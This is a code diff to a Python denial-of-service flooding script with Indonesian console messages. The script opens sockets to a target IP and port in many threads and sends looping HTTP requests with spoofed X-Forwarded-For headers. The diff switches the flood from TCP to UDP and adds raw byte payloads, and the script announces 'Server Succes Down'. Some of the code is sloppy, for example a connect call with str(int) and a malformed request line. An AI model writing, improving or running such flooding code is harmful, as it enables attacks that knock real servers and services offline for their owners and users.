@@ -55,24 +55,28 @@ def start2():
   connection3 += "X-Forwarded-For: " + spoofer3() + "\r\n"
   connect = "Connection : keep-Alive\r\n\r\n"
   get_rand = random.choice(['GET','POST',"HEAD"])
-  get_host = "GET /Attacked-RR/1.1\r\nHost: " + str(ip) + "\r\n"
+  get_host = "GET /Attacked-RR/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + connect + connection + get_rand + "\r\n"
   while True:
         try:
-          s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-          s.connect((str(ip),int(port)))
-          s.send(request)
-          s.send(request)
-          s.send(request)
+          s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+          s.connect((ip,port))
+          s.send(byte1)
+          s.send(byte1)
+          s.send(byte1)
+          s.sendall(str.encode(request))
+          s.sendall(str.encode(request))
           for i in range(th):
               s.connect((str(int),int(port)))
-              s.send(request)
-              s.send(request)
-              s.send(request)
+              s.send(byte1)
+              s.send(byte1)
+              s.send(byte1)
+              s.sendall(str.encode(request))
+              s.sendall(str.encode(request))
               print("Succes Mengirimkan THREAD Sebesar Cintamu Kepadaku😝🚬 ")
         except:
-              s.close()
-              print("Server Succes Down")
+             s.close()
+             print("Server Succes Down")
 for i in range(th):
   th = threading.Thread(target=start2)
   th.start()
